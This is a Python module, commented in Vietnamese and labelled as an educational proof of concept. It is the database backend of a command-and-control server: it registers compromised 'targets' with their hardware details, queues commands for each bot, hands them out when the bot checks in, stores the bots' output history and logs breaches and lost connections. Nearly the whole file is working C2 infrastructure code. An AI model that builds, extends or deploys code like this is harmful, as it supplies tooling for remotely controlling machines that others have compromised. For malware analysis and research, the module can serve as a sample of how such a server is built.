# ======================================================================
# DISCLAIMER: This script is part of an educational Proof of Concept (PoC) project.
# It is intended strictly for authorized testing, malware analysis research,
# and educational purposes only. Do not use this for malicious activities.
# ======================================================================
import sqlite3
from datetime import datetime

DB_FILE = 'c2_database.db'

# ========================================
# Quản lý kết nối cơ sở dữ liệu
# ========================================

# Đảm bảo cột tồn tại trong bảng
def ensure_column_exists(conn, table, column, col_type):
    existing = [r['name'] for r in conn.execute(f"PRAGMA table_info({table})").fetchall()]
    if column not in existing:
        conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {col_type}")

# Lấy kết nối cơ sở dữ liệu
def get_db():
    conn = sqlite3.connect(DB_FILE, timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

# ========================================
# Khởi tạo bảng cơ sở dữ liệu
# ========================================

# Khởi tạo các bảng cơ sở dữ liệu
def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                bot_id TEXT PRIMARY KEY,
                history TEXT,
                last_seen TEXT,
                status TEXT,
                cpu REAL,
                ram REAL,
                os_ver TEXT,
                cpu_name TEXT,
                gpu_name TEXT,
                ram_total TEXT,
                disk_total TEXT
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                command TEXT
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time_str TEXT,
                message TEXT
            )
        ''')

        ensure_column_exists(conn, 'agents', 'cpu', 'REAL')
        ensure_column_exists(conn, 'agents', 'ram', 'REAL')
        ensure_column_exists(conn, 'agents', 'os_ver', 'TEXT')
        ensure_column_exists(conn, 'agents', 'cpu_name', 'TEXT')
        ensure_column_exists(conn, 'agents', 'gpu_name', 'TEXT')
        ensure_column_exists(conn, 'agents', 'ram_total', 'TEXT')
        ensure_column_exists(conn, 'agents', 'disk_total', 'TEXT')

    print("[*] SQLite database initialized.")

# ========================================
# Quản lý nhật ký
# ========================================

# Thêm nhật ký hệ thống
def add_log(message):
    time_str = datetime.now().strftime('%H:%M:%S')
    with get_db() as conn:
        conn.execute('INSERT INTO logs (time_str, message) VALUES (?, ?)', (time_str, message))

# ========================================
# Quản lý Agent
# ========================================

# Xử lý check-in của agent
def check_in_agent(bot_id, hw_info=None):
    now_str = datetime.now().isoformat()
    log_msg = ""

    hw_info = hw_info or {}
    os_ver = hw_info.get('os_ver', '--')
    cpu_name = hw_info.get('cpu_name', '--')
    gpu_name = hw_info.get('gpu_name', '--')
    ram_total = hw_info.get('ram_total', '--')
    disk_total = hw_info.get('disk_total', '--')

    with get_db() as conn:
        agent = conn.execute(
            'SELECT * FROM agents WHERE bot_id = ?',
            (bot_id,)
        ).fetchone()
        if agent is None:
            conn.execute(
                '''INSERT INTO agents
                   (bot_id, history, last_seen, status, cpu, ram, os_ver, cpu_name, gpu_name, ram_total, disk_total)
                   VALUES (?, ?, ?, 'online', 0, 0, ?, ?, ?, ?, ?)''',
                (bot_id, "", now_str, os_ver, cpu_name, gpu_name, ram_total, disk_total)
            )
            log_msg = f"[+] NEW TARGET BREACHED: {bot_id}"
        else:
            conn.execute(
                '''UPDATE agents SET last_seen = ?, status = 'online',
                   os_ver = ?, cpu_name = ?, gpu_name = ?, ram_total = ?, disk_total = ?
                   WHERE bot_id = ?''',
                (now_str, os_ver, cpu_name, gpu_name, ram_total, disk_total, bot_id)
            )
            log_msg = f"[*] TARGET RECONNECTED: {bot_id}"

    if log_msg:
        add_log(log_msg)

# Cập nhật thời gian cuối cùng nhìn thấy agent
def update_last_seen(bot_id):
    now_str = datetime.now().isoformat()
    with get_db() as conn:
        conn.execute(
            "UPDATE agents SET last_seen = ?, status = 'online' WHERE bot_id = ?",
            (now_str, bot_id)
        )

# ========================================
# Quản lý lệnh
# ========================================

# Đồng bộ agent và lấy lệnh
def sync_agent(bot_id, cpu, ram):
    update_last_seen(bot_id)
    now_str = datetime.now().isoformat()
    with get_db() as conn:
        conn.execute(
            "UPDATE agents SET last_seen = ?, status = 'online', cpu = ?, ram = ? WHERE bot_id = ?",
            (now_str, cpu, ram, bot_id)
        )

        cmd_row = conn.execute(
            'SELECT id, command FROM commands WHERE bot_id = ? ORDER BY id ASC LIMIT 1',
            (bot_id,)
        ).fetchone()
        if cmd_row:
            conn.execute(
                'DELETE FROM commands WHERE id = ?',
                (cmd_row['id'],)
            )
            return cmd_row['command']
    return None

# ========================================
# Quản lý lịch sử
# ========================================

# Nối thêm văn bản vào lịch sử của agent
def append_history(bot_id, added_text):
    update_last_seen(bot_id)
    with get_db() as conn:
        agent = conn.execute(
            'SELECT history FROM agents WHERE bot_id = ?',
            (bot_id,)
        ).fetchone()
        if agent:
            new_history = agent['history'] + added_text
            conn.execute(
                "UPDATE agents SET history = ? WHERE bot_id = ?",
                (new_history, bot_id)
            )

# Hàng đợi lệnh cho agent
def queue_command(bot_id, cmd):
    with get_db() as conn:
        conn.execute(
            'INSERT INTO commands (bot_id, command) VALUES (?, ?)',
            (bot_id, cmd)
        )

    add_log(f"[-] Command deployed '{cmd}' to target {bot_id}")

# ========================================
# Bảng điều khiển
# ========================================

# Lấy dữ liệu bảng điều khiển và xử lý timeout
def get_dashboard_data():
    current_time = datetime.now()
    db_dict = {}
    dead_bots_to_log = []

    with get_db() as conn:
        logs_rows = conn.execute(
            'SELECT time_str, message FROM logs ORDER BY id DESC LIMIT 50'
        ).fetchall()
        logs = [f"[{r['time_str']}] {r['message']}" for r in logs_rows]

        agents_rows = conn.execute(
            'SELECT * FROM agents'
        ).fetchall()
        for row in agents_rows:
            bot_id = row['bot_id']
            last_seen = datetime.fromisoformat(row['last_seen'])
            status = row['status']

            if status == 'online' and (current_time - last_seen).total_seconds() > 10:
                status = 'offline'
                conn.execute(
                    "UPDATE agents SET status = 'offline' WHERE bot_id = ?",
                    (bot_id,)
                )
                dead_bots_to_log.append(bot_id)

            db_dict[bot_id] = {
                "history": row['history'],
                "status": status,
                "last_seen": row['last_seen'],
                "cpu": row['cpu'] or 0,
                "ram": row['ram'] or 0,
                "os_ver": row['os_ver'] or "Unknown",
                "cpu_name": row['cpu_name'] or "Unknown",
                "gpu_name": row['gpu_name'] or "Unknown",
                "ram_total": row['ram_total'] or "Unknown",
                "disk_total": row['disk_total'] or "Unknown"
            }

    for bot_id in dead_bots_to_log:
        add_log(f"[!] WARNING: {bot_id} connection lost (timeout)!")

    return db_dict, logs